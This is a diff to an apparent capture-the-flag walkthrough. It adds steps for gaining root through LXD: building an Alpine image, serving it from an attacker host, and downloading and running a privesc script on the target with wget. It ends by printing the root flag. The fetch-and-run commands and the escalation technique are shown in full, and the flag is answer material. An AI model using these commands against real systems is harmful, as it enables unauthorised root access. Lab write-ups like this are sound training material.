@@ -159,7 +159,38 @@ wget http://<your-IP>:8000/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh | tee linlog.txt
 ```
+Now we know there is lxd vulnerabilites
 
+On attacker terminal
+```
+git clone "https://github.com/saghul/lxd-alpine-builder/"
+cd lxd-alpine-builder/
+./build-alpine
+python3 -m http.server
+```
+0n target terminal 
+```
+wget "http://<your-ip>:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz"
+wget "http://<your-ip>:8000/lxc_privesc.sh"
+chmod +x lxc_privesc.sh
+./lxc_privesc.sh -f alpine-v3.13-x86_64-20210218_0139.tar.gz
+```
+And we get the root access
+```
+ls
+whoami
+pwd
+ls
+cd home
+ls -la
+cd /mnt
+ls
+cd root
+cat root.txt
+2e337b8c9f3aff0c2b3e8d4e6a7c88fc
+```
+Flag root
+2e337b8c9f3aff0c2b3e8d4e6a7c88fc
 
 
 
